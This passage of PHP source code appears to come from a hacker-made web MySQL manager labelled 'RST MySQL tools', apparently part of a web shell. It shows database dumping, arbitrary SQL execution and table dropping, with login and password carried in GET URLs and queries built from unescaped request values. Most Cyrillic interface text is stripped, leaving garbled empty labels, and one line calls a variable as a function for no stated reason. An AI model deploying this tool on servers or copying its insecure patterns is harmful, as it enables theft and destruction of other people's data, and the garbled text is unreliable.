  <tr bgcolor=#DAD9D9><td> Web-.</td><td>".$HTTP_SERVER_VARS["SERVER_PORT"]."</td></tr>
  <tr bgcolor=#DAD9D9><td> CGI .</td><td>".$HTTP_SERVER_VARS["GATEWAY_INTERFACE"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>     ().</td><td>".$HTTP_SERVER_VARS["REQUEST_METHOD"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>Root    .</td><td>".$HTTP_SERVER_VARS["DOCUMENT_ROOT"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>  .</td><td>".$HTTP_SERVER_VARS["HTTP_CONNECTION"]."</td></tr>
  <tr bgcolor=#DAD9D9><td> httpd.conf (SERVER_ADMIN).</td><td>".$HTTP_SERVER_VARS["SERVER_ADMIN"]."</td></tr>
  <tr bgcolor=#DAD9D9><td> .</td><td>".$HTTP_SERVER_VARS["SERVER_SIGNATURE"]."</td></tr>
 </table><br>";
 unset($apc);
}

/*--------------- MySQL --------------*/
if (isset($stat) && $stat=="TRUE"){
$result = mysql_query("SHOW STATUS", $connection); 
 print "<center><font size=2>  MySQL  [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=400 bgcolor=#FFFFFF><tr align=center bgcolor=#B6B5B5><td>  </td><td> </td></tr>";
 while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
   print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td></tr>";  
 } 
  print "</table>";
 mysql_free_result($result);
}

/*---------------  MySQL --------------*/
if (isset($var) && $var=="TRUE"){
$result = mysql_query("SHOW VARIABLES ", $connection); 
 print "<center><font size=2>  MySQL  [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF><tr align=center bgcolor=#B6B5B5><td> </td><td> </td></tr>";
 while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
   print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td></tr>";  
 } 
  print "</table>";
 mysql_free_result($result);
unset($var);
}

/*-------------  ------------*/
if (isset($db) && !isset($tbl)) {
$cnt=mysql_num_rows(mysql_list_tables($db)); //-  
 print "<table border=0 align=center width=100% cellpadding=0 cellspacing=0>
         <tr>
           <td>
                <table border=0 align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>
                   <tr align=center>                      
                      <td width=20% bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&cr_tbl=new\" title=\"     $db\"><b> </b></a>
                      </td>
                      <td width=20% bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&query_tbl&q_tbl=bd\" title=\"   \"><b>SQL-</b></a>
                      </td>
                      <td width=20% bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&str=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  \"><b></b></a>
                      </td>
                      <td width=20% bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&dump=bd\" title=\"   $db\"><b> </b></a>
                      </td>
                      <td width=20% bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&drop=$db&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  $db\" onClick=\"return confirm('  $db ?')\";><b> </b></a>
                     </td>
                   </tr> 
                </table> 
           </td>
         </tr>
         <tr>
           <td><br>";
               print "&nbsp;&nbsp;:(<b>$db</b>)  &nbsp;&nbsp; :(<b>$cnt</b>)";
               if (isset($t)) { print "<br>&nbsp;&nbsp;".base64_decode($t);}
               if (isset($t2)) { print base64_decode($t2);}
/*-------------  ------------------*/
if (isset($str) && $str=='TRUE'){
  mysql_select_db($db);
  if ($cnt < 1) { 
      print "<table border=1 width=400 align=center bgcolor=#E7E7D7><tr align=center>".
            "<td><br><h5>   <br>  <font color=blue>".
            "$db</font>  !</h5></td></tr></table><br><br>";     
  }else{
    $result = mysql_query("SHOW TABLE STATUS", $connection); 
    print "<br><center><font size=2>  [ <b>$db</b> ]</font></center>".
          "<table align=center border=0 cellpadding=0 cellspacing=1 width=650 bgcolor=#FFFFFF>".
          "<tr align=center bgcolor=#B6B5B5><td> </td><td></td><td></td><td></td>".
          "<td></td><td>(kb)</td><td></td></tr>";
    while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
      $size=$row[5]/1000;
      print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td><td align=center>$row[3]</td>".
            "<td>$row[10]</td><td>$row[11]</td><td align=center>$size</td><td bgcolor=red align=center>".
            "<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&".
            "port=$port&drop_table=$row[0]\" onClick=\"return confirm('  $row[0]?')\";></a></td>
            </tr>";  
    } 
    print "</table><br>";
    mysql_free_result($result);
  }
} 

print "    </td>
         </tr>
       </table>";
}

/*------------ ----------------*/
$form_dump_bd=
"<form method=\"GET\" action=\"$self\">".
"<input type=\"hidden\" name=\"s\" value=\"$s\">".
"<input type=\"hidden\" name=\"db\" value=\"$db\">".
"<input type=\"hidden\" name=\"server\" value=\"$server\">".
"<input type=\"hidden\" name=\"port\" value=\"$port\">".
"<input type=\"hidden\" name=\"login\" value=\"$login\">".
"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
"<input type=\"hidden\" name=\"f_dump\" value=\"$file\">".
"<input type=\"hidden\" name=\"dump\" value=\"bd\">".
"<input type=\"hidden\" name=\"strukt\" value=\"d_strukt_bd\">".
"<table align=center bgcolor=#FFFFFF width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".
"<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".
"<tr><td align=center><b>Dump </b> [ <font color=green><b>$db</b></font> ]</td></tr>".
"<tr><td align=center><font color=gray><b>  </b></font></td></tr>".
"<tr><td align=center><hr size=1 color=#FFFFFF><b></b> (/)</td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_br\" checked=\"checked\">   </td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_http\">     HTTP</td></tr>".
"<tr><td align=center><br><input type=\"submit\" value=\" \"></td></tr>".
"</table>".
"</td></tr></table></form>";

if ($HTTP_GET_VARS['dump']=='bd') {
   if ($cnt >= 1) {
      print $form_dump_bd;
   }else{ 
      print "<table border=1 width=400 align=center bgcolor=#E7E7D7><tr align=center>".
            "<td><br><h5>   <br>  <font color=blue>".
            "$db</font>  !</h5></td></tr></table><br><br>";
   }
}
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
if ($HTTP_GET_VARS['strukt']=='d_strukt_bd' && $HTTP_GET_VARS['send']=='send_br'){
   if (sizeof($tabs) == 0) { 
      //     
      $res = mysql_query("SHOW TABLES FROM $db", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_row($res)) { 
            $tabs[] .= $row[0]; 
         } 
      } 
   } 
       //      
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\n# Home page: http://rst.void.ru\n#\n# Host settings:\n# MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# ".$host." (".$ip.")"." dump db \"".$db."\"\n#____________________________________________________________\n\n"); 
   foreach($tabs as $tab) {       
      if ($add_drop) { 
         fputs($fp, "DROP TABLE IF EXISTS `".$tab."`;\n");
      }        
      //       
      $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $connection) or die(mysql_error()); 
      $row = mysql_fetch_row($res); 
      fputs($fp, $row[1].";\n\n"); 
       
      //    
      $res = mysql_query("SELECT * FROM `$tab`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      } 
      fputs ($fp, "#---------------------------------------------------------------------------------\n\n"); 
   } 
   fclose($fp);
   $dump_file=file($file);
   print "<table border=1 align=center cellpadding=2 bgcolor=#F0F1F4 width=98%><tr><td>";
   print "<table border=0 align=center cellpadding=2 bgcolor=#F0F1F4>";
   foreach ($dump_file as $k=>$v) {
        $v=str_replace("\n","<br>",$v);
        print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";
   }
   print "</table></td></tr></table><br>";
   unlink($file);
} 

/*--------------  ---------------*/
 $form_cr_tbl=
 "<form method=\"GET\" action=\"$self\">".
 "<input type=\"hidden\" name=\"s\" value=\"$s\">".
 "<input type=\"hidden\" name=\"db\" value=\"$db\">".
 "<input type=\"hidden\" name=\"server\" value=\"$server\">".
 "<input type=\"hidden\" name=\"port\" value=\"$port\">".
 "<input type=\"hidden\" name=\"login\" value=\"$login\">".
 "<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
 "<table align=center bgcolor=#FFFFFF width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".
 "<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".
 "<tr><td align=center><b>    </b> [ <font color=green><b>$db</b></font> ]<hr color=#FFFFFF></td></tr>".
 "<tr><td align=center>  : <input type=\"text\" name=\"new_tbl_name\" value=\"\" size=25></td></tr>".
 "<tr><td align=center>  :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"text\" name=\"new_count_cols\" value=\"\" size=10></td></tr>".
 "<tr><td align=center><br><input type=\"submit\" value=\" \"></td></tr>".
 "</table>".
 "</td></tr></table></form>";


if (isset($HTTP_GET_VARS['cr_tbl']) && $HTTP_GET_VARS['cr_tbl']=='new'){
  print "$form_cr_tbl";   
}
if ( (isset($new_count_cols)) && (ereg("[^0-9]",$new_count_cols) || preg_match("/ +/",$new_count_cols) || $new_count_cols=='') ) { 
    print "<script>alert('   -  ,   - !');</script>";
    print "$form_cr_tbl";   
}  

if ( (ereg("[0-9]",$HTTP_GET_VARS['new_count_cols'])) && ($HTTP_GET_VARS['new_tbl_name'] !=='') ) {

 for ($i=0; $i < $HTTP_GET_VARS['new_count_cols']; $i++) {

  $pole_count .= "<tr align=center bgcolor=#DDDDDD>".
      "<td><input type=\"text\" name=\"field_name[]\" size=\"10\" value=\"\"></td>".
      "<td>
            <select name=\"field_type[]\" width=3>
                <option value=\"VARCHAR\">VARCHAR</option>
                <option value=\"TINYINT\">TINYINT</option>
                <option value=\"TEXT\">TEXT</option>
                <option value=\"DATE\">DATE</option>
                <option value=\"SMALLINT\">SMALLINT</option>
                <option value=\"MEDIUMINT\">MEDIUMINT</option>
                <option value=\"INT\">INT</option>
                <option value=\"BIGINT\">BIGINT</option>
                <option value=\"FLOAT\">FLOAT</option>
                <option value=\"DOUBLE\">DOUBLE</option>
                <option value=\"DECIMAL\">DECIMAL</option>
                <option value=\"DATETIME\">DATETIME</option>
                <option value=\"TIMESTAMP\">TIMESTAMP</option>
                <option value=\"TIME\">TIME</option>
                <option value=\"YEAR\">YEAR</option>
                <option value=\"CHAR\">CHAR</option>
                <option value=\"TINYBLOB\">TINYBLOB</option>
                <option value=\"TINYTEXT\">TINYTEXT</option>
                <option value=\"BLOB\">BLOB</option>
                <option value=\"MEDIUMBLOB\">MEDIUMBLOB</option>
                <option value=\"MEDIUMTEXT\">MEDIUMTEXT</option>
                <option value=\"LONGBLOB\">LONGBLOB</option>
                <option value=\"LONGTEXT\">LONGTEXT</option>
                <option value=\"ENUM\">ENUM</option>
                <option value=\"SET\">SET</option>
            </select>
        </td>".
      "<td><input type=\"text\" name=\"field_length[]\" size=\"6\" value=\"\"></td>".
      "<td>
            <select name=\"field_attribute[]\">    
                <option value=\"\" selected=\"selected\"></option>
                <option value=\"BINARY\">BINARY</option>
                <option value=\"UNSIGNED\">UNSIGNED</option>
                <option value=\"UNSIGNED ZEROFILL\">UNS-D ZEROFILL</option>
            </select>
      </td>".
      "<td>
            <select name=\"field_null[]\">   
                <option value=\"NOT NULL\">not null</option>
                <option value=\"\">null</option>
            </select>
       </td>".
       "<td><input type=\"text\" name=\"field_default[]\" size=\"14\" value=\"\"></td>".
       "<td>
            <select name=\"field_extra[]\">
                <option value=\"\"></option>
                <option value=\"AUTO_INCREMENT\">auto_increment</option>
             </select>
        </td>".
        "<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"primary_0\"></td>".
        "<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"index_0\"></td>".
        "<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"unique_0\"></td>".
        "<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"no\" checked=\"checked\"></td>".
      "</tr>";
 }

  print 
     "<form method=\"GET\" action=\"$self\">".
     "<input type=\"hidden\" name=\"s\" value=\"$s\">".
     "<input type=\"hidden\" name=\"db\" value=\"$db\">".
     "<input type=\"hidden\" name=\"new_tbl_name\" value=\"$new_tbl_name\">".
     "<input type=\"hidden\" name=\"server\" value=\"$server\">".
     "<input type=\"hidden\" name=\"port\" value=\"$port\">".
     "<input type=\"hidden\" name=\"login\" value=\"$login\">".
     "<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
     "<table align=center bgcolor=#FFFFFF width=98% cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".
     "<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".
     "<tr><td align=center><b>  </b> [ <font color=green><b>$new_tbl_name</b></font> ] <b> </b> [ <font color=green><b>$db</b></font> ]<hr color=#FFFFFF></td></tr>".
     "<tr><td align=center>".
     "<table bgcolor=#000000 border=0 cellspacing=1 cellpadding=2 bgcolor=#F0F1F4 width=100%>".
     "<tr align=center bgcolor=silver><td><b></b></td><td><b></b></td><td><b></b></td><td><b></b></td><td><b></b></td><td><b> </b></td><td><b></b></td><td><b></b></td><td><b></b></td><td><b>-o</b></td><td><b>---</b></td></tr>";


            print $pole_count;


print
    "</table><br><b>  :</b> <input type=\"text\" name=\"comment\" size=\"40\" maxlength=\"80\">
     &nbsp;&nbsp;&nbsp;&nbsp;<b> :</b>
            <select name=\"tbl_type\">
                <option value=\"Default\"> </option>
                <option value=\"MYISAM\">MyISAM</option>
                <option value=\"HEAP\">Heap</option>
                <option value=\"MERGE\">Merge</option>
                <option value=\"ISAM\">ISAM</option>
            </select>&nbsp;&nbsp;&nbsp;&nbsp;
           <input type=\"checkbox\" name=\"php_kod\" value=\"ok\">  PHP- 
    </td></tr>".
    "<tr><td align=center><br><input type=\"submit\" value=\" \"></td></tr>".
    "</table>".
    "</td></tr></table></form>";
}

if (isset($HTTP_GET_VARS['field_name'])) {

    for ($i=0; $i<count($field_name); $i++) {
       if ($HTTP_GET_VARS['field_name'][$i] !=='') {
         $n_name .= "`$field_name[$i]` ";
         if ($HTTP_GET_VARS['field_length'][$i] !=='') {
             $n_name .= "$field_type[$i]($field_length[$i]) ";
         }else{
             $n_name .= "$field_type[$i] ";
         }
         if ($HTTP_GET_VARS['field_attribute'][$i] !=='') { $n_name .= "$field_attribute[$i] "; }
         if ($HTTP_GET_VARS['field_null'][$i] =='NOT NULL') { $n_name .= "$field_null[$i] "; }
         if ($HTTP_GET_VARS['field_default'][$i] !=='') { $n_name .= "DEFAULT '$field_default[$i]' "; }
         if ($HTTP_GET_VARS['field_extra'][$i] =='AUTO_INCREMENT') { $n_name .= "$field_extra[$i], "; }else{ $n_name .=', '; }

         /*-------- primary,index,unique----------*/
         if ($HTTP_GET_VARS['field_key_0'][$i] !=='no') { 
            if ($HTTP_GET_VARS['field_key_0'][$i] =='primary_0') {
                $n_prim .= " `$field_name[$i]`, "; 
            }
            if ($HTTP_GET_VARS['field_key_0'][$i] =='index_0') { 
                $n_ind .= " `$field_name[$i]`, "; 
            }
            if ($HTTP_GET_VARS['field_key_0'][$i] =='unique_0') { 
                $n_uniq .= " `$field_name[$i]`, "; 
            }
         }
         /*--------END primary,index,unique----------*/
       }
    }  //end for

    $n_name=substr_replace($n_name,"",-2);                     
    if (count($n_prim)>0) {
       $n_prim=substr_replace($n_prim,"",-2); 
       $n_name .=", PRIMARY KEY ($n_prim)";
    }
    if (count($n_ind)) {
       $n_ind=substr_replace($n_ind,"",-2); 
       $n_name .=", INDEX ($n_ind)";
    }
    if (count($n_uniq)) {
       $n_uniq=substr_replace($n_uniq,"",-2); 
       $n_name .=", UNIQUE ($n_uniq)";
    }

   $sql_new_tbl = "CREATE TABLE `$new_tbl_name` ( $n_name )";

   if ($HTTP_GET_VARS['tbl_type'] !=='Default') {
      $sql_new_tbl .= " TYPE =$tbl_type";
   }
   if ($HTTP_GET_VARS['comment'] !=='') {
     $sql_new_tbl .= " COMMENT = '$comment'";
   }       

  $r_n_tbl=mysql_db_query($db, $sql_new_tbl) or die("$h_error".mysql_error()."$f_error");
  $t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#706D6D size=2> [ <b>$new_tbl_name</b> ]  .</font><br>");
   if ($HTTP_GET_VARS['php_kod']=='ok') { 
        $t2=base64_encode("<br><table bgcolor=#EDEEF1 align=center width=98%><font color=green><b>PHP- :</b></font><tr><td>\$sql='$sql_new_tbl';</td></tr></table><br><br>");
   }else{ $t2=''; }
  print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&t=$t&t2=$t2'></head>";
} 

/*--------------END c  ---------------*/

/*-------------   -------------*/
if ($HTTP_GET_VARS['q_tbl']=='bd') { $q_bd="SHOW TABLE STATUS "; }
if ($HTTP_GET_VARS['return_sql']=='ok') { $q_bd=trim($HTTP_GET_VARS['new_query_bd']);}
$form_query_db="<br>
        <form method=\"GET\" action=\"$self?s=$s\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">                
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <table align=center width=90% border=0 bgcolor=#EDEEF1><tr><td>     ( <b>$db</b> )</td></tr>
        <tr><td width=90>
        <textarea name=\"new_query_bd\" rows=\"10\" cols=\"80\">$q_bd</textarea>
        </td><td valign=top>
        <input type=\"checkbox\" name=\"php_kod\" value=\"ok\">  PHP- <br><br>
        <input type=\"checkbox\" name=\"return_sql\" value=\"ok\" checked=\"checked\">    <br>
        <br>
        <a href=\"$self?s=$s&q_help=ok\" tarGET=\"_blank\"><b> </b></a>
        </td></tr>
        <tr><td>
        <input type=\"submit\" value=\"\">
        </td></tr>
        </table></form>";

if (isset($db) && $HTTP_GET_VARS['q_tbl']=='bd') { 
  print $form_query_db; 
}
if (isset($new_query_bd)) { 
   $new_query_bd=trim($new_query_bd);
   print $form_query_db;
   if ($HTTP_GET_VARS['php_kod']=='ok') { 
        print "&nbsp;&nbsp;&nbsp;<font color=green><b>PHP- :</b></font><br>&nbsp;&nbsp;&nbsp;\$sql=\"$new_query_bd\";<br><br>";
   }
  $r_q_bd=mysql_db_query($db, $new_query_bd) or die("$h_error".mysql_error()."$f_error");

  print "&nbsp;&nbsp;&nbsp;<b>  <b>";
  if ($r_q_bd !=='') {
    print "<table align=center width=98% bgcolor=#D7D8DA>";
    while ($line_bd = @mysql_fetch_array($r_q_bd, MYSQL_ASSOC)) {
        print "<tr>";
        foreach ($line_bd as $key_bd =>$col_value_bd) {          
            print "<td bgcolor=#EDEEF1>".htmlspecialchars($col_value_bd)."</td>";
        }
        print "</tr>";
    }
    print "</table><br>";
    @mysql_free_result($r_q_bd);
  }
} 

/*--------------- ------------*/
if (isset($drop_table) && isset($db)){ 
 mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
 $query = "DROP TABLE IF EXISTS $drop_table";
 $result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
 $t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#706D6D size=2> [ <b>$drop_table </b>]  .</font><br>");
 print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&t=$t'></head>";
 unset($drop_table);
}
if (isset($q_i)) { $n_img($tag,$f_n,$img_c); }

if (isset($db) && isset($tbl)) {
 /*    */
 $count=mysql_query ("SELECT COUNT(*) FROM $tbl");
 $count_row= mysql_fetch_array($count);  //$count_row[0] - 
 mysql_free_result($count);
 print "<table border=0 align=center width=100% cellpadding=0 cellspacing=0>
         <tr> 
           <td>
                <table align=center border=0 width=700 cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>
                   <tr align=center>                      
                      <td width=100 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&tbl=$tbl&st_tab=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  $tbl\"><b></b></a>
                      </td>
                      <td width=100 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&tbl=$tbl&login=$login&passwd=$passwd&server=$server&port=$port&nn_row=ok\" title=\"     $tbl\"><b></b></a>
                      </td>
                      <td width=120 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&tbl=$tbl&login=$login&passwd=$passwd&server=$server&port=$port&query_tbl&q_tbl=table\" title=\" SQL \"><b>SQL-</b></a>
                      </td>
                      <td width=120 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl&dump=tab\" title=\"   $tbl\"><b> </b></a>
                      </td>
                      <td width=120 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$tbl&alter_table=TRUE\" title=\"  $tbl\"><b></b></a>
                      </td>
                      <td width=120 bgcolor=#B6B5B5>
<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$db&drop_table=$tbl&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  $tbl\" onClick=\"return confirm('  $tbl ?')\";><b> </b></a>
                     </td>
                   </tr>
                </table> 
           </td>
         </tr>
         <tr>
           <td><br>";
                if (isset($t)) { print "&nbsp;&nbsp;".base64_decode($t);}
                print "&nbsp;&nbsp;:(<b>$db</b>)&nbsp;&nbsp;&nbsp;&nbsp;:(<b>$tbl</b>)&nbsp;&nbsp;&nbsp;
                 :(<b>$count_row[0]</b>)
           </td>
         </tr>
         <tr>
           <td> 
<table border=0 width=100% cellpadding=4 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   <td bgcolor=#E6E7E9 align=center valign=center>";

$start=$limit_start+$limit_count;

if (isset($start) && ($start>0)) {
 print "<table align=center border=0 cellpadding=4 cellspacing=0>
        <tr>";
       
if ($start+$limit_count >= $count_row[0]){
$start=$limit_start;
$limit_count=$count_row[0]-$start;
}

if (isset($start) && ($limit_start >= 30) ){
  $back=$limit_start-30;
  print "<form method=\"GET\" action=\"$self\">
        <td bgcolor=#FFFFFF align=center>       
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">
        <input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
        <input type=\"hidden\" name=\"limit_start\" value=\"$back\">
        <input type=\"hidden\" name=\"limit_count\" value=\"30\">
        <input type=\"submit\" value=\"<< (30)\">&nbsp;&nbsp;
        </td></form>";
}

print " <form method=\"GET\" action=\"$self\">
        <td bgcolor=#FFFFFF align=center>
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">
        <input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
        <input type=\"submit\" value=\"\">&nbsp;&nbsp;
        <input type=\"text\" name=\"limit_start\" value=\"$start\" size=\"5\" maxlength=\"5\">
        &nbsp;&nbsp; <input type=\"text\" name=\"limit_count\" value=\"$limit_count\" size=\"5\" maxlength=\"5\"> 
        </td></form>";

if ( isset($limit_start) && ($start <= $count_row[0]) ){
 print "<form method=\"GET\" action=\"$self\">
        <td bgcolor=#FFFFFF align=center>
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
        <input type=\"hidden\" name=\"limit_start\" value=\"$start\">
        <input type=\"hidden\" name=\"limit_count\" value=\"30\">
        <input type=\"submit\" value=\"(30)>>\">
        </td></form>";
}

print "</tr></form></table>";
}


/*------------ ------------*/
if ($alter_table=="TRUE"){
print " <form method=\"GET\" action=\"$self\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
        <input type=\"hidden\" name=\"alter_table\" value=\"$alter_table\">
        <table border=0 cellpadding=4 cellspacing=1 bgcolor=#FFFFFF>
        <tr><td bgcolor=#DAD9D9 align=center><font size=2>  [ <b>$tbl</b> ]</font></td></tr>
        <tr><td bgcolor=#DAD9D9>  :
        <input type=\"text\" name=\"alttbl\" value=\"\">
        <input type=\"submit\" value=\"\" onClick=\"return confirm(' ,     \' $tbl \' ?')\";>
        </td></tr></table></form>";
}

 if (isset($alttbl)){
 mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
 //$query = "RENAME TABLE $tbl TO $alttbl";
 $query = "ALTER TABLE $tbl RENAME TO $alttbl";
 $result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
 $t=base64_encode("<font color=green size=2><b>Action: </b></font><font color=#706D6D size=2> [ <b>$tbl ]</b>   [ <b>$alttbl</b> ]</font><br>");
 print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&tbl=$alttbl&limit_start=0&limit_count=5&t=$t'></head>";
 }

/*------------------- -----------------*/
if (isset($st_tab) && $st_tab=='TRUE'){
 mysql_select_db($st_db);
 $result = mysql_query('desc '.$tbl, $connection); 
 print "<br><center><font size=2>  [ <b>$tbl</b> ]</font><center>".
       "<table align=center border=0 cellpadding=2 cellspacing=1 width=700 bgcolor=#FFFFFF>";
 
 for ($i=0;$i<@mysql_num_fields($result);$i++){
       $name=mysql_field_name($result,$i);
       $name=eregi_replace("Field","",trim($name));
       $name=eregi_replace("Type","",trim($name));
       $name=eregi_replace("Null","",trim($name));
       $name=eregi_replace("Key","",trim($name));
       $name=eregi_replace("Default"," ",trim($name));
       $name=eregi_replace("Extra","",trim($name));
       $nn .= "<td align=center bgcolor=#C7C5C5><b>$name</b></td>";   
 } 
 print "<tr>$nn</tr>";
 while ($l_tbl = @mysql_fetch_array($result, MYSQL_ASSOC)) {      
     print "<tr bgcolor=#E7E7D7>";
     foreach ($l_tbl as $k_tbl =>$col_v_tbl) {          
          if (strtoupper(substr($col_v_tbl, 0, 3)) === 'PRI') {
             $col_v_tbl="";
          }
          if (strtoupper(substr($col_v_tbl, 0, 3)) === 'UNI') {
             $col_v_tbl="";
          }
          if (strtoupper(substr($col_v_tbl, 0, 3)) === 'MUL' && $col_v_tbl !=='') {
             $col_v_tbl="";
          }
          if (strtoupper(substr($col_v_tbl, 0, 3)) === 'YES') { $col_v_tbl=""; }
          if (eregi("Field", $k_tbl)) { 
             print "<td><font color=green><b>".htmlspecialchars($col_v_tbl)."</b></font></td>";
          }elseif (eregi("Type", $k_tbl)) { 
             print "<td align=left>".htmlspecialchars($col_v_tbl)."</td>";
          }else{
             print "<td align=center>".htmlspecialchars($col_v_tbl)."</td>";             
          }
     }
     print "</tr>";
 }
 print "</table><br>";
 @mysql_free_result($result);
}

/*-------------   -------------*/
if ($HTTP_GET_VARS['q_tbl']=='table') { $q_tbl="SELECT * FROM `$tbl` WHERE 1 LIMIT 0, 30"; }
if ($HTTP_GET_VARS['return_sql']=='ok') { $q_tbl=trim($HTTP_GET_VARS['new_query_tbl']); }
$form_query_db_tbl="<br>
        <form method=\"GET\" action=\"$self?s=$s\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">                
        <input type=\"hidden\" name=\"db\" value=\"$db\">
        <input type=\"hidden\" name=\"tbl\" value=\"$tbl\">
